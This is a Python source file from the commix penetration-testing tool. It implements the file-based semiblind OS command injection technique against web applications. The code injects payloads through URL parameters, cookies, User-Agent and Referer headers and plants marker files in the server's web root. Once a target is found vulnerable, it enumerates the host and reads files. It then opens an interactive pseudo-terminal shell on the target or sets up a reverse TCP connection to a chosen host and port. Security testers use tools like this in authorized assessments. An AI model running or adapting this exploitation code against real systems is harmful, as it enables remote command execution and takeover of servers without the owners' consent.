#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of commix (@commixproject) tool.
Copyright (c) 2014-2015 Anastasios Stasinopoulos (@ancst).
https://github.com/stasinopoulos/commix

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import sys
import time
import string
import random
import base64
import urllib
import urllib2
import urlparse 
import readline

from src.utils import menu
from src.utils import logs
from src.utils import settings

from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.requests import headers
from src.core.shells import reverse_tcp
from src.core.requests import parameters
from src.core.injections.controller import checks

from src.core.injections.semiblind.techniques.file_based import fb_injector
from src.core.injections.semiblind.techniques.file_based import fb_payloads
from src.core.injections.semiblind.techniques.file_based import fb_enumeration
from src.core.injections.semiblind.techniques.file_based import fb_file_access
from src.core.injections.semiblind.techniques.tempfile_based import tfb_handler

"""
The "file-based" technique on semiblind OS command injection.
"""

"""
Check ff temp-based technique has failed, 
then use the "/tmp/" directory for tempfile-based technique.
"""
def tfb_controller(no_result, url, delay, filename, tmp_path, http_request_method, url_time_response):
  if no_result == True:
    sys.stdout.write("(*) Trying to create a file, in temporary directory (" + tmp_path + ")...\n")
    call_tfb = tfb_handler.exploitation(url, delay, filename, tmp_path, http_request_method, url_time_response)   
    return call_tfb
  else :
    sys.stdout.write("\r")
    sys.stdout.flush()

"""
Delete previous shells outputs.
"""
def delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
  if settings.TARGET_OS == "win":
    cmd = settings.WIN_DEL + OUTPUT_TEXTFILE + " " + separator + settings.WIN_COMMENT
  else:  
    cmd = settings.DEL + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE
  response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)

"""
Provide custom server's root directory
"""
def custom_srv_root_dir():
  settings.SRV_ROOT_DIR = raw_input("(?) Please provide the host's root directory (e.g. /var/www/) > ")
  settings.CUSTOM_SRV_ROOT_DIR = True

"""
The "file-based" injection technique handler
"""
def fb_injection_handler(url, delay, filename, http_request_method, url_time_response):
  counter = 1
  failed_tries = 20
  vp_flag = True
  exit_loops = False
  no_result = True
  is_encoded= False
  stop_injection = False
  call_tmp_based = False
  export_injection_info = False
  injection_type = "Semiblind Command Injection"
  technique = "file-based injection technique"

  # Set temp path 
  if settings.TARGET_OS == "win":
    settings.TMP_PATH = "%temp%\\"
  else:
    settings.TMP_PATH = "/tmp/"

  if menu.options.tmp_path:
    tmp_path = menu.options.tmp_path
  else:
    tmp_path = settings.TMP_PATH

  if menu.options.file_dest and '/tmp/' in menu.options.file_dest:
    call_tmp_based = True
  else:
    if menu.options.srv_root_dir:
      settings.SRV_ROOT_DIR = menu.options.srv_root_dir
    else:
      # Debian/Ubunt have been updated to use /var/www/html as default instead of /var/www.
      if "apache" in settings.SERVER_BANNER.lower():
        if "debian" or "ubuntu" in settings.SERVER_BANNER.lower():
          try:
            check_version = re.findall(r"/(.*)\.", settings.SERVER_BANNER.lower())
            if check_version[0] > "2.3" and not settings.TARGET_OS == "win":
              # Add "/html" to servers root directory
              settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR + "/html"
            else:
              settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR 
          except IndexError:
            pass
        # Add "/html" to servers root directory
        elif "fedora" or "centos" in settings.SERVER_BANNER.lower():
          settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR + "/html"
        else:
          pass
      # On more recent versions (>= "1.2.4") the default root path has changed to "/usr/share/nginx/html"
      elif "nginx" in settings.SERVER_BANNER.lower():
        try:
          check_version = re.findall(r"/(.*)\.", settings.SERVER_BANNER.lower())
          if check_version[0] >= "1.2.4":
            # Add "/html" to servers root directory
            settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR + "/html"
          else:
            # Add "/www" to servers root directory
            settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR + "/www"
        except IndexError:
          pass

      else:
        # Provide custom server's root directory.
        custom_srv_root_dir()

      path = urlparse.urlparse(url).path
      path_parts = path.split('/')
      count = 0
      for part in path_parts:        
        count = count + 1
      count = count - 1
      last_param = path_parts[count]
      EXTRA_DIR = path.replace(last_param, "")
      settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR + EXTRA_DIR

    if not menu.options.verbose:
      print "(*) Trying to create a file in '" + settings.SRV_ROOT_DIR + "'... "
    else:
      print "(*) Testing the " + technique + "... "

  i = 0
  # Calculate all possible combinations
  total = len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)
  # Check if defined alter shell
  alter_shell = menu.options.alter_shell
  
  for prefix in settings.PREFIXES:
    for suffix in settings.SUFFIXES:
      for separator in settings.SEPARATORS:
        i = i + 1
        # Change TAG on every request to prevent false-positive results.
        TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) 
        # The output file for file-based injection technique.
        OUTPUT_TEXTFILE = TAG + ".txt"    
        # Check for bad combination of prefix and separator
        combination = prefix + separator
        if combination in settings.JUNK_COMBINATION:
          prefix = ""

        try:
          # File-based decision payload (check if host is vulnerable).
          if alter_shell :
            payload = fb_payloads.decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE)
          else:
            payload = fb_payloads.decision(separator, TAG, OUTPUT_TEXTFILE)
                  
          # Check if defined "--prefix" option.
          # Fix prefixes / suffixes
          payload = parameters.prefixes(payload, prefix)
          payload = parameters.suffixes(payload, suffix)

          if menu.options.base64:
            payload = base64.b64encode(payload)

          # Check if defined "--verbose" option.
          if menu.options.verbose:
            print "(*) Trying to upload the '" + OUTPUT_TEXTFILE + "' file on '" + settings.SRV_ROOT_DIR + "'..."
            print Fore.GREY + "(~) Payload: " + payload.replace("\n", "\\n") + Style.RESET_ALL

          # Cookie Injection
          if settings.COOKIE_INJECTION == True:
            # Check if target host is vulnerable to cookie injection.
            vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
            response = fb_injector.cookie_injection_test(url, vuln_parameter, payload)

          # User-Agent Injection
          elif settings.USER_AGENT_INJECTION == True:
            # Check if target host is vulnerable to user-agent injection.
            vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)
            response = fb_injector.user_agent_injection_test(url, vuln_parameter, payload)          

          # Referer Injection
          elif settings.REFERER_INJECTION == True:
            # Check if target host is vulnerable to referer injection.
            vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)
            response = fb_injector.referer_injection_test(url, vuln_parameter, payload)

          else:
            # Check if target host is vulnerable.
            response, vuln_parameter = fb_injector.injection_test(payload, http_request_method, url)

          # Find the directory.
          output = fb_injector.injection_output(url, OUTPUT_TEXTFILE, delay)
          time.sleep(delay)
          
          try:
            # Check if defined extra headers.
            request = urllib2.Request(output)
            headers.do_check(request)
            
            # Evaluate test results.
            output = urllib2.urlopen(request)
            html_data = output.read()
            shell = re.findall(r"" + TAG + "", html_data)

            if len(shell) != 0 and shell == TAG and not menu.options.verbose:
              percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
              sys.stdout.write("\r(*) Testing the " + technique + "... [ " + percent + " ]")  
              sys.stdout.flush()

            if len(shell) == 0 :
              #delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
              #if menu.options.verbose:
                #print ""
              raise urllib2.HTTPError(url, 404, 'Error', {}, None)

          except urllib2.HTTPError, e:
              if e.getcode() == 404:
                percent = ((i*100)/total)
                float_percent = "{0:.1f}".format(round(((i*100)/(total*1.0)),2))

                if call_tmp_based == True:
                  exit_loops = True
                  tmp_path = os.path.split(menu.options.file_dest)[0] + "/"
                  tfb_controller(no_result, url, delay, filename, tmp_path, http_request_method, url_time_response)
                  raise
                  
                # Show an error message, after 20 failed tries.
                # Use the "/tmp/" directory for tempfile-based technique.
                elif i == failed_tries and no_result == True :
                  if not menu.options.verbose:
                    print ""
                  print Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read and/or write files in '" + settings.SRV_ROOT_DIR + "'." + Style.RESET_ALL
                  while True:
                    tmp_upload = raw_input("(?) Do you want to try the temporary directory (" + tmp_path + ") [Y/n/q] > ").lower()
                    if tmp_upload in settings.CHOISE_YES:
                      exit_loops = True
                      call_tfb = tfb_controller(no_result, url, delay, filename, tmp_path, http_request_method, url_time_response)
                      if call_tfb != False:
                        return True
                      else:
                        if no_result == True:
                          return False
                        else:
                          return True
                    elif tmp_upload in settings.CHOISE_NO:
                      break
                    elif tmp_upload in settings.CHOISE_QUIT:
                      print ""
                      raise
                    else:
                      if tmp_upload == "":
                        tmp_upload = "enter"
                      print Back.RED + "(x) Error: '" + tmp_upload + "' is not a valid answer." + Style.RESET_ALL
                      pass
                  continue
                
                else:
                  if exit_loops == False:
                    if not menu.options.verbose:
                      if percent == 100:
                        if no_result == True:
                          percent = Fore.RED + "FAILED" + Style.RESET_ALL
                        else:
                          percent = str(float_percent)+ "%"
                      else:
                        percent = str(float_percent)+ "%"

                      sys.stdout.write("\r(*) Testing the " + technique + "... [ " + percent + " ]")  
                      sys.stdout.flush()
                      continue
                    else:
                      continue
                  else:
                    raise
                
              elif e.getcode() == 401:
                print Back.RED + "(x) Error: Authorization required!" + Style.RESET_ALL + "\n"
                sys.exit(0)
                
              elif e.getcode() == 403:
                print Back.RED + "(x) Error: You don't have permission to access this page." + Style.RESET_ALL + "\n"
                sys.exit(0)
          
        except KeyboardInterrupt:
          # Delete previous shell (text) files (output)
          delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
          raise

        except SystemExit: 
          if 'vuln_parameter' in locals():
            # Delete previous shell (text) files (output)
            delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
          else:
            pass

          #delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
          raise

        except urllib2.URLError, e:
          # print "\n" + Back.RED + "(x) Error: " + str(e.reason) + Style.RESET_ALL
          print Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read and/or write files in '" + settings.SRV_ROOT_DIR + "'." + Style.RESET_ALL
          # Provide custom server's root directory.
          custom_srv_root_dir()
          continue
        
        except:
          raise
          
        # Yaw, got shellz! 
        # Do some magic tricks!
        if shell:
          found = True
          no_result = False
          
          if settings.COOKIE_INJECTION == True: 
            header_name = " Cookie"
            found_vuln_parameter = vuln_parameter
            the_type = " HTTP header"

          elif settings.USER_AGENT_INJECTION == True: 
            header_name = " User-Agent"
            found_vuln_parameter = ""
            the_type = " HTTP header"

          elif settings.REFERER_INJECTION == True: 
            header_name = " Referer"
            found_vuln_parameter = ""
            the_type = " HTTP header"
 
          else:
            header_name = ""
            the_type = " parameter"
            if http_request_method == "GET":
              found_vuln_parameter = parameters.vuln_GET_param(url)
            else :
              found_vuln_parameter = vuln_parameter

          if len(found_vuln_parameter) != 0 :
            found_vuln_parameter = " '" + Style.UNDERLINE + found_vuln_parameter + Style.RESET_ALL  + Style.BRIGHT + "'" 

          # Print the findings to log file.
          if export_injection_info == False:
            export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
          if vp_flag == True:
            vp_flag = logs.add_parameter(vp_flag, filename, http_request_method, vuln_parameter, payload)
          logs.update_payload(filename, counter, payload) 
          counter = counter + 1
          
          # Print the findings to terminal.
          print Style.BRIGHT + "\n(!) The (" + http_request_method + ")" + found_vuln_parameter + header_name + the_type + " is vulnerable to " + injection_type + "." + Style.RESET_ALL
          print "  (+) Type : " + Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
          print "  (+) Technique : " + Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
          print "  (+) Payload : " + Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload.replace("\n", "\\n")) + Style.RESET_ALL

          # Check for any enumeration options.
          if settings.ENUMERATION_DONE == True :
            while True:
              enumerate_again = raw_input("\n(?) Do you want to enumerate again? [Y/n/q] > ").lower()
              if enumerate_again in settings.CHOISE_YES:
                fb_enumeration.do_check(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                break
              elif enumerate_again in settings.CHOISE_NO: 
                break
              elif file_access_again in settings.CHOISE_QUIT:
                # Delete previous shell (text) files (output)
                delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                sys.exit(0)
              else:
                if enumerate_again == "":
                  enumerate_again = "enter"
                print Back.RED + "(x) Error: '" + enumerate_again + "' is not a valid answer." + Style.RESET_ALL
                pass
          else:
            fb_enumeration.do_check(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)

          # Check for any system file access options.
          if settings.FILE_ACCESS_DONE == True :
            while True:
              file_access_again = raw_input("(?) Do you want to access files again? [Y/n/q] > ").lower()
              if file_access_again in settings.CHOISE_YES:
                if not menu.options.verbose:
                  print ""
                fb_file_access.do_check(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                break
              elif file_access_again in settings.CHOISE_NO: 
                break
              elif file_access_again in settings.CHOISE_QUIT:
                # Delete previous shell (text) files (output)
                delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                sys.exit(0)
              else:
                if file_access_again == "":
                  file_access_again  = "enter"
                print Back.RED + "(x) Error: '" + file_access_again  + "' is not a valid answer." + Style.RESET_ALL
                pass
          else:
            fb_file_access.do_check(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
          
          # Check if defined single cmd.
          if menu.options.os_cmd:
            fb_enumeration.single_os_cmd_exec(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
            # Delete previous shell (text) files (output)
            delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
            sys.exit(0)

          try:
            # Pseudo-Terminal shell
            go_back = False
            go_back_again = False
            while True:
              # Delete previous shell (text) files (output)
              delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
              if menu.options.verbose:
                print ""
              if go_back == True:
                break
              gotshell = raw_input("(?) Do you want a Pseudo-Terminal? [Y/n/q] > ").lower()
              if gotshell in settings.CHOISE_YES:
                print ""
                print "Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)"
                while True:
                  # Tab compliter
                  readline.set_completer(menu.tab_completer)
                  readline.parse_and_bind("tab: complete")
                  cmd = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
                  cmd = checks.escaped_cmd(cmd)
                  if cmd.lower() in settings.SHELL_OPTIONS:
                    os_shell_option = checks.check_os_shell_options(cmd.lower(), technique, go_back, no_result) 
                    if os_shell_option == False:
                      return False
                    elif os_shell_option == "quit": 
                      # Delete previous shell (text) files (output)
                      delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)         
                      sys.exit(0)
                    elif os_shell_option == "back":
                      go_back = True
                      break
                    elif os_shell_option == "os_shell": 
                        print Fore.YELLOW + "(^) Warning: You are already into an 'os_shell' mode." + Style.RESET_ALL + "\n"
                    elif os_shell_option == "reverse_tcp":
                      settings.REVERSE_TCP = True
                      # Set up LHOST / LPORT for The reverse TCP connection.
                      lhost, lport = reverse_tcp.configure_reverse_tcp()
                      while True:
                        if lhost and lport in settings.SHELL_OPTIONS:
                          result = checks.check_reverse_tcp_options(lhost)
                        else:  
                          cmd = reverse_tcp.reverse_tcp_options(lhost, lport)
                          result = checks.check_reverse_tcp_options(cmd)
                        if result != None:
                          if result == 0:
                            return False
                          elif result == 1 or result == 2:
                            settings.REVERSE_TCP = False
                            go_back_again = True
                            break
                        # Command execution results.
                        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                        # Command execution results.
                        shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
                        if menu.options.verbose:
                          print ""
                        print Back.RED + "(x) Error: The reverse TCP connection has been failed!" + Style.RESET_ALL
                    else:
                      pass
                  else:
                    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                    # Command execution results.
                    shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
                    
                    if shell:
                      shell = " ".join(str(p) for p in shell)
                      if shell != "":
                        print "\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n"

                    if not shell or shell == "":
                        print Back.RED + "(x) Error: The '" + cmd + "' command, does not return any output." + Style.RESET_ALL + "\n"

              elif gotshell in settings.CHOISE_NO:
                if menu.options.verbose:
                  print ""
                if checks.next_attack_vector(technique, go_back) == True:
                  break
                else:
                  if no_result == True:
                    return False 
                  else:
                    return True  

              elif gotshell in settings.CHOISE_QUIT:
                # Delete previous shell (text) files (output)
                delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                sys.exit(0)

              else:
                if gotshell == "":
                  gotshell = "enter"
                print Back.RED + "(x) Error: '" + gotshell + "' is not a valid answer." + Style.RESET_ALL
                pass
            
          except KeyboardInterrupt: 
            # Delete previous shell (text) files (output)
            delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
            raise
            
  if no_result == True:
    print ""
    return False

  else :
    sys.stdout.write("\r")
    sys.stdout.flush()

"""
The exploitation function.
(call the injection handler)
"""
def exploitation(url, delay, filename, http_request_method, url_time_response):
  if fb_injection_handler(url, delay, filename, http_request_method, url_time_response) == False:
    return False

#eof